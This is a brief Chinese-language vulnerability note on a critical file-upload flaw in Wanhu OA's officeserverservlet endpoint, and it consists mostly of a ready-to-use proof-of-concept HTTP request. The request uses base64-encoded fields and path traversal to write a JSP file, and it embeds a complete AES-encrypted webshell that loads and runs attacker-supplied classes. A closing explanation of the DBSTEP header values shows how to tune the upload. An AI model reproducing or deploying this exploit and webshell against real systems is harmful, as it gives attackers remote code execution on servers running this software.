## 万户 OA 文件上传漏洞

```
漏洞等级：严重
漏洞详情：/defaultroot/officeserverservlet 路径存在文件上传漏洞
```

> 参考POC
```
POST /defaultroot/officeserverservlet HTTP/1.1
Host: XXXXXXXXX:7001
Content-Length: 782
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://XXXXXXXX7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, li
ke Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,imag
e/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cookie: OASESSIONID=CC676F4D1C584324CEFE311E71F2EA08; LocLan=zh_CN
Connection: close
DBSTEP V3.0 170 0 1000 DBSTEP=REJTVE
VQ
OPTION=U0FWRUZJTEU=
RECORDID=
isDoc=dHJ1ZQ==
moduleType=Z292ZG9jdW1lbnQ=
FILETYPE=Li4vLi4vdXBncmFkZS82LmpzcA==
111111111111111111111111111111111111111
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends Class
Loader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.le
ngth);}}%><%if (request.getMethod().equals("POST")){String k="892368804b205b83";/*man
ba*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec
(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE6
4Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContex
t);}%>
```

```
DBSTEP V3.0 170 0 1000
170 是控制从报文中什么地方读取
1000 是控制 webshell 源代码内容大小
```
